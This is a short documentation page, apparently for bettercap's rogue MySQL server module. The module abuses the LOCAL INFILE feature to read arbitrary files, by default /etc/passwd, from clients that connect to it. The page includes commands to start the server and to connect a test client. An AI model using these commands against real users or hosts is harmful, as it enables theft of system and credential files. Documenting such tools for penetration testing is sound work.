---
title: mysql.server (rogue)
description: A rogue MySQL server that can be used to exploit LOCAL INFILE and read arbitrary files from the client.
---

A **rogue MySQL server** that exploits the `LOCAL INFILE` vulnerability.
Reads **arbitrary files** from connecting clients.

## Commands

### `mysql.server on`

Start the **rogue MySQL server**.

### `mysql.server off`

Stop the **rogue MySQL server**.

## Parameters

| Parameter              | Default               | Description                                                                      |
| ---------------------- | --------------------- | -------------------------------------------------------------------------------- |
| `mysql.server.address` | `<interface address>` | Address to bind the mysql server to.                                             |
| `mysql.server.infile`  | `/etc/passwd`         | File you want to read. UNC paths are also supported.                             |
| `mysql.server.outfile` |                       | If filled, the INFILE buffer will be saved to this path instead of being logged. |
| `mysql.server.port`    | `3306`                | Port to bind the mysql server to.                                                |

## Examples

Start the server and read `/etc/hosts` from connecting clients:

```bash
sudo bettercap -eval "set mysql.server.infile /etc/hosts; mysql.server on"
```

Connect to test and see the file output in bettercap:

```bash
mysql -u root -h 192.168.1.123 -pasdsasad --enable-local-infile
```
